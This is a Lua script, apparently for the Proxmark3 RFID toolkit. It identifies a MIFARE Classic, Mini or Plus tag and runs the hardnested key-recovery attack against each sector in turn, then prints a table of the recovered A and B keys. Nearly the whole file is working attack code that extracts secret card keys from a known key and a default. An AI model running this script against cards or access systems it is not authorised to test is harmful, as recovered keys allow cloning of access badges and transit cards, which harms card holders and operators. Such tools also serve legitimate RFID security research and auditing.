local cmds = require('commands')
local getopt = require('getopt')
local utils = require('utils')
local lib14a = require('read14a')

example = "script iterates over all possible sectors for a tag and runs hardnested attack against them to collect the keys."
author = "Iceman"
desc =
[[
This script iterates over all possible sectors for a tag and runs hardnested attack against them to collect the keys.

Arguments:
	-k 		Known key, 6 bytes (12 hex digits)
	-a		key A
	-b		key B
	-s 		Blocknumber for known key
Examples : 
	script hard -k 112233445566
]]

local numBlocks = 64
local numSectors = 16
local DEBUG = TRUE
--- 
-- A debug printout-function
function dbg(args)
	if not DEBUG then return end
	
    if type(args) == "table" then
		local i = 1
		while result[i] do
			dbg(result[i])
			i = i+1
		end
	else
		print("###", args)
	end	
end	
--- 
-- This is only meant to be used when errors occur
function oops(err)
	print("ERROR: ",err)
	return nil,err
end
--- 
-- Usage help
function help()
	print(desc)
	print("Example usage")
	print(example)
end
--
-- Exit message
function ExitMsg(msg)
	print( string.rep('--',20) )
	print( string.rep('--',20) )
	print(msg)
	print()
end
-- A little helper to place an item first in the list
local function placeFirst(akey, list)
	akey  = akey:lower()
	if list[1] == akey then 
		-- Already at pole position
		return list
	end
	local result = {akey}
	--print(("Putting '%s' first"):format(akey))
	for i,v in ipairs(list) do
		if v ~= akey then 
			result[#result+1] = v
		end
	end
	return result
end
-- A function to display the results
-- TODO: iceman 2016,  still screws up output when a key is not found.
local function displayresults(results)
	local sector, blockNo, keyA, keyB, succA, succB, _

	print("|---|----------------|---|----------------|---|")
	print("|sec|key A           |res|key B           |res|")
	print("|---|----------------|---|----------------|---|")

	for sector,_ in pairs(results) do
		succA, succB, keyA, keyB = unpack(_)
		print(("|%03d|  %s  | %s |  %s  | %s |"):format(sector, keyA, succA, keyB, succB))
	end
	print("|---|----------------|---|----------------|---|")

end

--[[
The mifare Classic 1k card has 16 sectors of 4 data blocks each. 
The first 32 sectors of a mifare Classic 4k card consists of 4 data blocks and the remaining
8 sectors consist of 16 data blocks. 
--]]
local function GetTargetBlockNo(sector)
	local trgblockno = sector * 4 - 1 
	if sector > 32 then
		trgblockno = 32 * 4 + (sector-32) * 16 -1
	end
	return ("%02x"):format(trgblockno)
end

--- 
-- The main entry point
function main(args)

	local blockno = '00'
	local keytype
	local key = 'fc00018778f7'
	local trgkey = ''
	local numSectors = 16 	
	
	-- Read the parameters
	for o, a in getopt.getopt(args, 'hk:abs:') do
		if o == "h" then return help() end
		if o == "k" then key = a end
		if o == "a" then keytype = '0' end
		if o == "b" then keytype = '1' end
		if o == "s" then blockno = a end
	end

	keytype = keytype or '0'
	
	-- Turn off Debug
	local cmdSetDbgOff = "hf mf dbg 0"
	core.console( cmdSetDbgOff) 
	core.clearCommandBuffer()
	-- identify tag
	result, err = lib14a.read1443a(false)
	if not result then return oops(err) end

	-- Show tag info
	print((' Found tag %s'):format(result.name))
	
	if 0x18 == result.sak then --NXP MIFARE Classic 4k | Plus 4k
		-- IFARE Classic 4K offers 4096 bytes split into forty sectors, 
		-- of which 32 are same size as in the 1K with eight more that are quadruple size sectors. 
		numSectors = 40
	elseif 0x08 == result.sak then -- NXP MIFARE CLASSIC 1k | Plus 2k
		-- 1K offers 1024 bytes of data storage, split into 16 sector
		numSectors = 16
	elseif 0x09 == result.sak then -- NXP MIFARE Mini 0.3k
		-- MIFARE Classic mini offers 320 bytes split into five sectors.
		numSectors = 5
	elseif  0x10 == result.sak then-- "NXP MIFARE Plus 2k"
		numSectors = 32
	else
		print("I don't know how many sectors there are on this type of card, defaulting to 16")
	end

	result = {}
	for sector=1,numSectors do
		
		local trgblockno = GetTargetBlockNo(sector)
		local succA = 1
		local succB = 1
		local keyA = ''
		local keyB = ''
		
		for targetkeytype=0,1 do
			
			-- skip first sector, KeyA...  
			-- or actually blockNo and keytype
			-- just try default for now
			if sector == 1 and targetkeytype == 0 then
				keyA = utils.ConvertHexToAscii(key)
			else
				local err, foundkey = core.hardnested(blockno, keytype, key, trgblockno, tostring(targetkeytype), trgkey, 0,0,0,0)
				foundkey = foundkey or ""
				
				if targetkeytype == 0 then
					if err == nil or err > 0 then succA = 0 else keyA = foundkey end
				else
					if err == nil or err > 0 then succB = 0 else keyB = foundkey end
				end
			end

			-- clearing BigBuff between hardnested executions seems to make it more stable.
			core.clearCommandBuffer()
			core.console('data buffclear')
		end
		-- Check if user aborted
		if core.ukbhit() then
			print("Aborted by user")
			break
		end
		-- log
		result[sector] = { succA, succB, utils.ConvertAsciiToHex(keyA), utils.ConvertAsciiToHex(keyB) }
	end
	displayresults(result)
end

main(args)